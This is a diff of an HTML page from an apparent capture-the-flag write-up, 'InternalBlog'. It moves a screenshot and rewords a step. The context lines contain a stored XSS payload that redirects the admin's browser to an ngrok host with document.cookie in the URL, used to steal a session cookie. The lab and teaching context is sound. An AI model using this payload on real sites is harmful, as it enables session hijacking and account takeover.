@@ -1324,7 +1324,7 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="436 words"
+  title="437 words"
 >
   <em>2 min</em> read</span>
 
@@ -1496,10 +1496,11 @@ The localhost port is 3000. Take a closer look and see if you can uncover anythi
 
 <p>Admin will look at the newly created post, triggering the XSS and leaking his cookie.</p>
 
-<p>I’ll use my own tool, <a href="http://127.0.0.1:4000/posts/xsserve/">xsserve</a>, to spawn a publicly accessible HTTP server.<br /></p>
+<p>I’ll use my own tool, <a href="http://127.0.0.1:4000/posts/xsserve/">xsserve</a>, to spawn a publicly accessible HTTP server.<br />
+<a href="/assets/img/writeups/InternalBlog/xsserve_andtoken.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/InternalBlog/xsserve_andtoken.png" alt="index"  loading="lazy"></a>
+<em>Launch XSServe, create the user with malicious XSS payload</em></p>
 
-<p>Next we have to modify the <code class="language-plaintext highlighter-rouge">PAYLOAD = </code> line in the previous script, and put a more agressive XSS payload:</p>
-
+<p>We just have to modify the <code class="language-plaintext highlighter-rouge">PAYLOAD =</code> line in the previous script, and put this XSS payload before launching it:</p>
 <div class="language-python highlighter-rouge"><div class="code-header">
         <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
@@ -1513,9 +1514,6 @@ The localhost port is 3000. Take a closer look and see if you can uncover anythi
 window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
 &lt;/script&gt;</span><span class="sh">"""</span>
 </pre></td></tr></tbody></table></code></div></div>
-
-<p><a href="/assets/img/writeups/InternalBlog/xsserve_andtoken.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/InternalBlog/xsserve_andtoken.png" alt="index"  loading="lazy"></a>
-<em>Launch XSServe, create the user with malicious XSS payload</em></p>
 
 <p>Finally, we create a post as this user:
 <a href="/assets/img/writeups/InternalBlog/create_post_2.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/InternalBlog/create_post_2.png" alt="index"  loading="lazy"></a>
